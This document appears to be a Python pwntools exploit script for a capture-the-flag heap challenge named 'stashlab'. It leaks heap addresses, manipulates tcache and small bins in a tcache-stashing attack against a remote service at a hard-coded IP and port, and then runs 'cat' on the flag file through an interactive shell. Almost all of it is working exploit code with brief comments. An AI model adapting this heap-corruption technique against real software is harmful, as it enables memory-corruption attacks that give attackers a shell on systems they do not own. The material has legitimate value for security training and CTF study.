#!/usr/bin/python3

from pwn import *
import sys

BIN = './stashlab'

if len(sys.argv) > 1:
    r = remote( '140.112.31.97', 30107 )
else:
    r = process( BIN )

def add(size, uuid, data):
    r.sendafter("Choice >", '1')
    r.sendafter("size : ", str(size))
    r.sendafter("UUID : ", str(uuid))
    r.sendafter("Content : ", data)

def edit(idx, uuid):
    r.sendafter("Choice >", '2')
    r.sendafter("index : ", str(idx))
    r.sendafter("UUID : ", str(uuid))

def delete(idx):
    r.sendafter("Choice >", '3')
    r.sendafter("index : ", str(idx))

def supern(size, uuid, data):
    r.sendafter("Choice >", '4')
    r.sendafter("size : ", str(size))
    r.sendafter("UUID : ", str(uuid))
    r.sendafter("Content : ", data)

r.recvuntil('Lock address : ')
target = int(r.recvline()[2:-1], 16)
r.recvuntil('Chunk address : ')
heap = int(r.recvline()[2:-1], 16) - 0x2a0
log.info(f'target: {hex(target)}')
log.info(f'heap: {hex(heap)}')

for _ in range(8): # 0-7
    add(0x78, 1, 'QQ')
for i in range(1,8): # 1-7
    delete(i) # 0 -> unsorted bin, 0 for prevent merge with top chunk

delete(0) # unsorted bin

supern(0x78, 0, p64(heap + 0x2b0) + p64(target - 0x10)) # 8: make tcache lose one + trampoline
add(0x88, 1, 'QQ') # 9: make unsorted bin chunk (0) into small bin **need to create larger size**
edit(0, heap+0x6b0) # chunk G
add(0x78, 1, 'QQ')
"""
after do it, chunk G was returned by malloc, and trampoline was put into tcache,
making target(bck) -> small bin
"""

r.sendline('5')
sleep(0.3)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
